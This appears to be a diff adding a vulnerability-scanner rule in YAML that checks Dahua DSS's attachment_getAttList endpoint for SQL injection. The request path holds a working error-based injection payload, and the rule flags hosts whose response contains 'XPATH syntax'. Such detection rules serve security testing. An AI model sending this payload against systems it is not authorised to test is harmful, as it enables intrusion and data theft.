@@ -1,0 +1,12 @@
+cve-id: dahauDSS-attachment-getattList-sqli
+rules:
+- method: GET
+  path: /portal/attachment_getAttList.action?bean.TabName=1&bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO
+  headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
+      (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+    Accept-Encoding: gzip, deflate
+  expression: 'response.status == 200 && response.body.bcontains(b"XPATH syntax") '
+severity: high
+type: sqli
